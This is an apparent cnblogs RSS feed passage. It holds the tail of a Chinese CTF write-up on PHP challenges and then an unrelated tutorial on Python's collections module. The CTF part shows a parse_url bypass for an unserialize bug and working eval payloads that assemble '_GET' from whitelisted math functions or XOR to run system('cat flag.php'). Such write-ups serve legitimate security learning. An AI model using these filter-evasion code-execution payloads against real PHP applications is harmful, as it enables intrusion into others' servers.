@&lt;/span&gt;&lt;span&gt;include&lt;/span&gt;(&lt;span&gt;$file&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$payload&lt;/span&gt;&lt;span&gt;)){  
    &lt;/span&gt;&lt;span&gt;$url&lt;/span&gt; = &lt;span&gt;parse_url&lt;/span&gt;(&lt;span&gt;$_SERVER&lt;/span&gt;['REQUEST_URI'&lt;span&gt;]);
    &lt;/span&gt;&lt;span&gt;parse_str&lt;/span&gt;(&lt;span&gt;$url&lt;/span&gt;['query'],&lt;span&gt;$query&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt;(&lt;span&gt;$query&lt;/span&gt; &lt;span&gt;as&lt;/span&gt; &lt;span&gt;$value&lt;/span&gt;&lt;span&gt;){
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;preg_match&lt;/span&gt;(&quot;/flag/&quot;,&lt;span&gt;$value&lt;/span&gt;&lt;span&gt;)) { 
            &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;('stop hacking!'&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;exit&lt;/span&gt;&lt;span&gt;();
        }
    }
    &lt;/span&gt;&lt;span&gt;$payload&lt;/span&gt; = &lt;span&gt;unserialize&lt;/span&gt;(&lt;span&gt;$payload&lt;/span&gt;&lt;span&gt;);
}&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{ 
   &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;Missing parameters&quot;&lt;span&gt;; 
} 
&lt;/span&gt;?&amp;gt;
&amp;lt;!--Please test index.php?&lt;span&gt;file&lt;/span&gt;=xxx.php --&amp;gt;
&amp;lt;!--Please get the source of hint.php--&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里主要记录一下绕过parse_url，这里会检测flag字符串，但是要是让parse_url&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428214451233-1011488441.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428214506958-912256717.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这样就能使parse_url返回false，这样绕过对flag的过滤，然后后面就是常规的反序列化漏洞，这里要记住最后的序列化的数据因为有不可见字符所以需要urlencode一下&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;94&quot;&gt;
&lt;pre&gt;
&amp;lt;?&lt;span&gt;php 
&lt;/span&gt;&lt;span&gt;error_reporting&lt;/span&gt;(0&lt;span&gt;); 
&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;听说你很喜欢数学，不知道你是否爱它胜过爱flag &lt;/span&gt;
&lt;span&gt;if&lt;/span&gt;(!&lt;span&gt;isset&lt;/span&gt;(&lt;span&gt;$_GET&lt;/span&gt;['c'&lt;span&gt;])){ 
    &lt;/span&gt;&lt;span&gt;show_source&lt;/span&gt;(&lt;span&gt;__FILE__&lt;/span&gt;&lt;span&gt;); 
}&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;{ 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;例子 c=20-1 &lt;/span&gt;
    &lt;span&gt;$content&lt;/span&gt; = &lt;span&gt;$_GET&lt;/span&gt;['c'&lt;span&gt;]; 
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;strlen&lt;/span&gt;(&lt;span&gt;$content&lt;/span&gt;) &amp;gt;= 80&lt;span&gt;) { 
        &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;(&quot;太长了不会算&quot;&lt;span&gt;); 
    } 
    &lt;/span&gt;&lt;span&gt;$blacklist&lt;/span&gt; = [' ', '\t', '\r', '\n','\'', '&quot;', '`', '\[', '\]'&lt;span&gt;]; 
    &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;$blacklist&lt;/span&gt; &lt;span&gt;as&lt;/span&gt; &lt;span&gt;$blackitem&lt;/span&gt;&lt;span&gt;) { 
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;preg_match&lt;/span&gt;('/' . &lt;span&gt;$blackitem&lt;/span&gt; . '/m', &lt;span&gt;$content&lt;/span&gt;&lt;span&gt;)) { 
            &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;(&quot;请不要输入奇奇怪怪的字符&quot;&lt;span&gt;); 
        } 
    } 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp &lt;/span&gt;
    &lt;span&gt;$whitelist&lt;/span&gt; = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;preg_match_all&lt;/span&gt;('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', &lt;span&gt;$content&lt;/span&gt;, &lt;span&gt;$used_funcs&lt;/span&gt;&lt;span&gt;); 
    &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;$used_funcs&lt;/span&gt;[0] &lt;span&gt;as&lt;/span&gt; &lt;span&gt;$func&lt;/span&gt;&lt;span&gt;) { 
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;in_array&lt;/span&gt;(&lt;span&gt;$func&lt;/span&gt;, &lt;span&gt;$whitelist&lt;/span&gt;&lt;span&gt;)) { 
            &lt;/span&gt;&lt;span&gt;die&lt;/span&gt;(&quot;请不要输入奇奇怪怪的函数&quot;&lt;span&gt;); 
        } 
    } 
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;帮你算出答案 &lt;/span&gt;
    &lt;span&gt;eval&lt;/span&gt;('echo '.&lt;span&gt;$content&lt;/span&gt;.';'&lt;span&gt;); 
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt; 方法一：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这道题主要还是构造没有字母的shell，这里面又提供了进制转换的函数base_convert()，说明可以用0-9a-z 36个字符，那么就可以构造shell，这里主要通过分析一个payload：&lt;/p&gt;
&lt;pre&gt;
&lt;span class=&quot;nv&quot;&gt;$pi&lt;span class=&quot;o&quot;&gt;=base_convert&lt;span class=&quot;o&quot;&gt;(&lt;span class=&quot;m&quot;&gt;37907361743,10,36&lt;span class=&quot;o&quot;&gt;)(dechex&lt;span class=&quot;o&quot;&gt;(&lt;span class=&quot;m&quot;&gt;1598506324&lt;span class=&quot;o&quot;&gt;))&lt;span class=&quot;p&quot;&gt;;&lt;span class=&quot;o&quot;&gt;(&lt;span class=&quot;nv&quot;&gt;$$pi&lt;span class=&quot;o&quot;&gt;){pi&lt;span class=&quot;o&quot;&gt;}((&lt;span class=&quot;nv&quot;&gt;$$pi&lt;span class=&quot;o&quot;&gt;){abs&lt;span class=&quot;o&quot;&gt;})&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;span class=&quot;nv&quot;&gt;pi&lt;span class=&quot;o&quot;&gt;=system&lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;span class=&quot;nv&quot;&gt;abs&lt;span class=&quot;o&quot;&gt;=cat flag.php&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;span class=&quot;nv&quot;&gt;这里通过构造动态函数，首先base_convert()构造hex2bin，把16进制转换为字符串，再通过“_GET” -&amp;gt; 16进制表示，再到10进制表示，然后反过来dechex()-&amp;gt;hex2bin()，然后结合动态函数&lt;br/&gt;比如$a=&quot;_GET&quot;;$$a{c}(($$a){d}); 这样将实际的payload放在GET参数中，从而来减小长度。&lt;br/&gt;&lt;span&gt;另外一个点是php的数组不仅可以通过[]来进行索引，还可以通过{}来进行索引。&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;m&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;m&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;strong&gt;&lt;em&gt;&lt;span&gt;方法2：&lt;/span&gt;&lt;/em&gt;&lt;/strong&gt;&lt;br/&gt;另一种构造出_GET的方法是通过异或字符串：&lt;br/&gt;比如要得到_G，则可以通过：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428231147764-1774653583.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;具体怎么得出：可以通过“_G”和两个字符异或：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;$j&lt;/span&gt;=0;&lt;span&gt;$j&lt;/span&gt;&amp;lt;10;&lt;span&gt;$j&lt;/span&gt; = &lt;span&gt;$j&lt;/span&gt;+1&lt;span&gt;){
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;$i&lt;/span&gt;=0;&lt;span&gt;$i&lt;/span&gt;&amp;lt;10;&lt;span&gt;$i&lt;/span&gt; = &lt;span&gt;$i&lt;/span&gt;+1&lt;span&gt;){
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &lt;span&gt;$i&lt;/span&gt;.&lt;span&gt;$j&lt;/span&gt;.&quot; &quot;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;_G&quot;^(&lt;span&gt;$j&lt;/span&gt;).(&lt;span&gt;$i&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;echo&lt;/span&gt; &quot;\n&quot;&lt;span&gt;;
}}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1063309/201904/1063309-20190428231533186-1272266080.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;m&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;m&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;可以得到两位字符串，这里也可以选3位或者4位跑，但是因为得到的字符串需要在白名单里面找，所以太长了找不到，所以选两位最好，一位会增加payload长度，因此is是在白名单里存在的，所以就可以使用，同样的方法去找“ET”，最后&lt;br/&gt;还是去构造动态函数就可以了。&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;$abs&lt;/span&gt;=(&lt;span&gt;is_finite&lt;/span&gt;^(6).(4)).(&lt;span&gt;rad2deg&lt;/span&gt;^(7).(5));$&lt;span&gt;$abs&lt;/span&gt;{&lt;span&gt;acos&lt;/span&gt;}($&lt;span&gt;$abs&lt;/span&gt;{&lt;span&gt;ceil&lt;/span&gt;})
&lt;/pre&gt;&lt;/div&gt;

&lt;pre&gt;
&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;m&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;m&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;&gt;&lt;span class=&quot;p&quot;&gt;&lt;span class=&quot;nv&quot;&gt;&lt;span class=&quot;o&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;

</description>
<pubDate>Sun, 28 Apr 2019 15:20:00 +0000</pubDate>
<dc:creator>tr1ple</dc:creator>
<og:description>拖了好长时间，总结一下这一段时间做的几道值得记录一下的题目，有的没做出来，但是学习到了新的东西 1.homebrew event loop ddctf的一道题目，学到了python eval函数的用法</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wfzWebSecuity/p/10747867.html</dc:identifier>
</item>
<item>
<title>Python中collections模块 - Python运维开发</title>
<link>http://www.cnblogs.com/dianel/p/10787693.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/dianel/p/10787693.html</guid>
<description>&lt;p&gt;这个模块实现了特定目标的容器，以提供Python标准内建容器 dict、list、set、tuple 的替代选择。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Counter：字典的子类，提供了可哈希对象的计数功能&lt;/li&gt;
&lt;li&gt;defaultdict：字典的子类，提供了一个工厂函数，为字典查询提供了默认值&lt;/li&gt;
&lt;li&gt;OrderedDict：字典的子类，保留了他们被添加的顺序&lt;/li&gt;
&lt;li&gt;namedtuple：创建命名元组子类的工厂函数&lt;/li&gt;
&lt;li&gt;deque：类似列表容器，实现了在两端快速添加(append)和弹出(pop)&lt;/li&gt;
&lt;li&gt;ChainMap：类似字典的容器类，将多个映射集合到一个视图里面&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;counter&quot;&gt;Counter&lt;/h2&gt;
&lt;p&gt;Counter是一个dict子类，主要是用来对你访问的对象的频率进行计数。&lt;br/&gt;常用方法：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;elements()：返回一个迭代器，每个元素重复计算的个数，如果一个元素的计数小于1,就会被忽略。&lt;/li&gt;
&lt;li&gt;most_common([n])：返回一个列表，提供n个访问频率最高的元素和计数&lt;/li&gt;
&lt;li&gt;subtract([iterable-or-mapping])：从迭代对象中减去元素，输入输出可以是0或者负数&lt;/li&gt;
&lt;li&gt;update([iterable-or-mapping])：从迭代对象计数元素或者从另一个 映射对象 (或计数器) 添加。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;# 统计字符出现的次数
&amp;gt;&amp;gt;&amp;gt; import collections
&amp;gt;&amp;gt;&amp;gt; collections.Counter('hello world')
Counter({'l': 3, 'o': 2, 'h': 1, 'e': 1, ' ': 1, 'w': 1, 'r': 1, 'd': 1})
# 统计单词数
&amp;gt;&amp;gt;&amp;gt; collections.Counter('hello world hello world hello nihao'.split())
Counter({'hello': 3, 'world': 2, 'nihao': 1})&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;常用的方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; c = collections.Counter('hello world hello world hello nihao'.split())
&amp;gt;&amp;gt;&amp;gt; c
Counter({'hello': 3, 'world': 2, 'nihao': 1})
# 获取指定对象的访问次数，也可以使用get()方法
&amp;gt;&amp;gt;&amp;gt; c['hello']
3
&amp;gt;&amp;gt;&amp;gt; c = collections.Counter('hello world hello world hello nihao'.split())
# 查看元素
&amp;gt;&amp;gt;&amp;gt; list(c.elements())
['hello', 'hello', 'hello', 'world', 'world', 'nihao']
# 追加对象，或者使用c.update(d)
&amp;gt;&amp;gt;&amp;gt; c = collections.Counter('hello world hello world hello nihao'.split())
&amp;gt;&amp;gt;&amp;gt; d = collections.Counter('hello world'.split())
&amp;gt;&amp;gt;&amp;gt; c
Counter({'hello': 3, 'world': 2, 'nihao': 1})
&amp;gt;&amp;gt;&amp;gt; d
Counter({'hello': 1, 'world': 1})
&amp;gt;&amp;gt;&amp;gt; c + d
Counter({'hello': 4, 'world': 3, 'nihao': 1})
# 减少对象，或者使用c.subtract(d)
&amp;gt;&amp;gt;&amp;gt; c - d
Counter({'hello': 2, 'world': 1, 'nihao': 1})
# 清除
&amp;gt;&amp;gt;&amp;gt; c.clear()
&amp;gt;&amp;gt;&amp;gt; c
Counter()&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;defaultdict&quot;&gt;defaultdict&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;collections.defaultdict(default_factory)&lt;/code&gt;为字典的没有的key提供一个默认的值。参数应该是一个函数，当没有参数调用时返回默认值。如果没有传递任何内容，则默认为None。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; d = collections.defaultdict()
&amp;gt;&amp;gt;&amp;gt; d
defaultdict(None, {})
&amp;gt;&amp;gt;&amp;gt; e = collections.defaultdict(str)
&amp;gt;&amp;gt;&amp;gt; e
defaultdict(&amp;lt;class 'str'&amp;gt;, {})&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;defaultdict的一个典型用法是使用其中一种内置类型(如str、int、list或dict)作为默认工厂，因为这些内置类型在没有参数调用时返回空类型。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; d = collections.defaultdict(str)
&amp;gt;&amp;gt;&amp;gt; d
defaultdict(&amp;lt;class 'str'&amp;gt;, {})
&amp;gt;&amp;gt;&amp;gt; d['hello']
''
&amp;gt;&amp;gt;&amp;gt; d
defaultdict(&amp;lt;class 'str'&amp;gt;, {'hello': ''})
# 普通字典调用不存在的键时，将会抛异常
&amp;gt;&amp;gt;&amp;gt; e = {}
&amp;gt;&amp;gt;&amp;gt; e['hello']
Traceback (most recent call last):
  File &quot;&amp;lt;stdin&amp;gt;&quot;, line 1, in &amp;lt;module&amp;gt;
KeyError: 'hello'&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;int&lt;/code&gt;作为default_factory的例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from collections import defaultdict
&amp;gt;&amp;gt;&amp;gt; fruit = defaultdict(int)
&amp;gt;&amp;gt;&amp;gt; fruit['apple'] += 2 
&amp;gt;&amp;gt;&amp;gt; fruit
defaultdict(&amp;lt;class 'int'&amp;gt;, {'apple': 2})
&amp;gt;&amp;gt;&amp;gt; fruit
defaultdict(&amp;lt;class 'int'&amp;gt;, {'apple': 2})
&amp;gt;&amp;gt;&amp;gt; fruit['banana']  # 没有对象时，返回0
0
&amp;gt;&amp;gt;&amp;gt; fruit
defaultdict(&amp;lt;class 'int'&amp;gt;, {'apple': 2, 'banana': 0})&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;list&lt;/code&gt;作为default_factory的例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; s = [('NC', 'Raleigh'), ('VA', 'Richmond'), ('WA', 'Seattle'), ('NC', 'Asheville')]
&amp;gt;&amp;gt;&amp;gt; d = collections.defaultdict(list)
&amp;gt;&amp;gt;&amp;gt; for k,v in s:
...      d[k].append(v)
... 
&amp;gt;&amp;gt;&amp;gt; d
defaultdict(&amp;lt;class 'list'&amp;gt;, {'NC': ['Raleigh', 'Asheville'], 'VA': ['Richmond'], 'WA': ['Seattle']})&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;ordereddict&quot;&gt;OrderedDict&lt;/h2&gt;
&lt;p&gt;Python字典中的键的顺序是任意的:它们不受添加的顺序的控制。&lt;br/&gt;&lt;code&gt;collections.OrderedDict&lt;/code&gt;类提供了保留他们添加顺序的字典对象。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from collections import OrderedDict
&amp;gt;&amp;gt;&amp;gt; o = OrderedDict()
&amp;gt;&amp;gt;&amp;gt; o['key1'] = 'value1'
&amp;gt;&amp;gt;&amp;gt; o['key2'] = 'value2'
&amp;gt;&amp;gt;&amp;gt; o['key3'] = 'value3'
&amp;gt;&amp;gt;&amp;gt; o
OrderedDict([('key1', 'value1'), ('key2', 'value2'), ('key3', 'value3')])&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果在已经存在的key上添加新的值，将会保留原来的key的位置，然后覆盖value值。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; o['key1'] = 'value5'
&amp;gt;&amp;gt;&amp;gt; o
OrderedDict([('key1', 'value5'), ('key2', 'value2'), ('key3', 'value3')])&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;namedtuple&quot;&gt;namedtuple&lt;/h2&gt;
&lt;p&gt;三种定义命名元组的方法：第一个参数是命名元组的构造器（如下的：Person，Human）&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from collections import namedtuple
&amp;gt;&amp;gt;&amp;gt; Person = namedtuple('Person', ['age', 'height', 'name'])
&amp;gt;&amp;gt;&amp;gt; Human = namedtuple('Human', 'age, height, name')
&amp;gt;&amp;gt;&amp;gt; Human2 = namedtuple('Human2', 'age height name')&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;实例化命令元组&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; tom = Person(30,178,'Tom')
&amp;gt;&amp;gt;&amp;gt; jack = Human(20,179,'Jack')
&amp;gt;&amp;gt;&amp;gt; tom
Person(age=30, height=178, name='Tom')
&amp;gt;&amp;gt;&amp;gt; jack
Human(age=20, height=179, name='Jack')
&amp;gt;&amp;gt;&amp;gt; tom.age #直接通过  实例名+.+属性 来调用
30
&amp;gt;&amp;gt;&amp;gt; jack.name
'Jack'&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;deque&quot;&gt;deque&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;collections.deque&lt;/code&gt;返回一个新的双向队列对象，从左到右初始化(用方法 append()) ，从 iterable （迭代对象) 数据创建。如果 iterable 没有指定，新队列为空。&lt;br/&gt;&lt;code&gt;collections.deque&lt;/code&gt;队列支持线程安全，对于从两端添加(append)或者弹出(pop)，复杂度O(1)。&lt;br/&gt;虽然&lt;code&gt;list&lt;/code&gt;对象也支持类似操作，但是这里优化了定长操作（pop(0)、insert(0,v)）的开销。&lt;br/&gt;如果 maxlen 没有指定或者是 None ，deques 可以增长到任意长度。否则，deque就限定到指定最大长度。一旦限定长度的deque满了，当新项加入时，同样数量的项就从另一端弹出。&lt;br/&gt;支持的方法：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;append(x)：添加x到右端&lt;/li&gt;
&lt;li&gt;appendleft(x)：添加x到左端&lt;/li&gt;
&lt;li&gt;clear()：清楚所有元素，长度变为0&lt;/li&gt;
&lt;li&gt;copy()：创建一份浅拷贝&lt;/li&gt;
&lt;li&gt;count(x)：计算队列中个数等于x的元素&lt;/li&gt;
&lt;li&gt;extend(iterable)：在队列右侧添加iterable中的元素&lt;/li&gt;
&lt;li&gt;extendleft(iterable)：在队列左侧添加iterable中的元素，注：在左侧添加时，iterable参数的顺序将会反过来添加&lt;/li&gt;
&lt;li&gt;index(x[,start[,stop]])：返回第 x 个元素（从 start 开始计算，在 stop 之前）。返回第一个匹配，如果没找到的话，升起 ValueError 。&lt;/li&gt;
&lt;li&gt;insert(i,x)：在位置 i 插入 x 。注：如果插入会导致一个限长deque超出长度 maxlen 的话，就升起一个 IndexError 。&lt;/li&gt;
&lt;li&gt;pop()：移除最右侧的元素&lt;/li&gt;
&lt;li&gt;popleft()：移除最左侧的元素&lt;/li&gt;
&lt;li&gt;remove(value)：移去找到的第一个 value。没有抛出ValueError&lt;/li&gt;
&lt;li&gt;reverse()：将deque逆序排列。返回 None 。&lt;/li&gt;
&lt;li&gt;maxlen：队列的最大长度，没有限定则为None。&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from collections import deque
&amp;gt;&amp;gt;&amp;gt; d = deque(maxlen=10)
&amp;gt;&amp;gt;&amp;gt; d
deque([], maxlen=10)
&amp;gt;&amp;gt;&amp;gt; d.extend('python')
&amp;gt;&amp;gt;&amp;gt; [i.upper() for i in d]
['P', 'Y', 'T', 'H', 'O', 'N']
&amp;gt;&amp;gt;&amp;gt; d.append('e')
&amp;gt;&amp;gt;&amp;gt; d.appendleft('f')
&amp;gt;&amp;gt;&amp;gt; d
deque(['f', 'p', 'y', 't', 'h', 'o', 'n', 'e'], maxlen=10)&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;chainmap&quot;&gt;ChainMap&lt;/h2&gt;
&lt;p&gt;一个 ChainMap 将多个字典或者其他映射组合在一起，创建一个单独的可更新的视图。 如果没有 maps 被指定，就提供一个默认的空字典 。&lt;code&gt;ChainMap&lt;/code&gt;是管理嵌套上下文和覆盖的有用工具。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from collections import ChainMap
&amp;gt;&amp;gt;&amp;gt; d1 = {'apple':1,'banana':2}
&amp;gt;&amp;gt;&amp;gt; d2 = {'orange':2,'apple':3,'pike':1}
&amp;gt;&amp;gt;&amp;gt; combined_d = ChainMap(d1,d2)
&amp;gt;&amp;gt;&amp;gt; reverse_combind_d = ChainMap(d2,d1)
&amp;gt;&amp;gt;&amp;gt; combined_d 
ChainMap({'apple': 1, 'banana': 2}, {'orange': 2, 'apple': 3, 'pike': 1})
&amp;gt;&amp;gt;&amp;gt; reverse_combind_d
ChainMap({'orange': 2, 'apple': 3, 'pike': 1}, {'apple': 1, 'banana': 2})
&amp;gt;&amp;gt;&amp;gt; for k,v in combined_d.items():
...      print(k,v)
... 
pike 1
apple 1
banana 2
orange 2
&amp;gt;&amp;gt;&amp;gt; for k,v in reverse_combind_d.items():
...      print(k,v)
... 
pike 1
apple 3
banana 2
orange 2
&lt;/code&gt;
&lt;/pre&gt;</description>
